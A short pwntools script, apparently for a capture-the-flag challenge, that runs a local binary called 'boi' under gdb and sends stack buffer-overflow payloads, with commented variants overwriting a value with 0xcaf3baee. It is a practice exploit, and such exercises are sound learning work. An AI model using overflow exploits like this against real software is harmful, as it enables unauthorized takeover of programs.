from pwn import *

p = gdb.debug("./boi")

payload = 'A' * 10 
#payload = 'A' * 16 + 'BB'
#payload = 'A' * 20 + p32(0xcaf3baee)

p.sendline(payload)

p.interactive()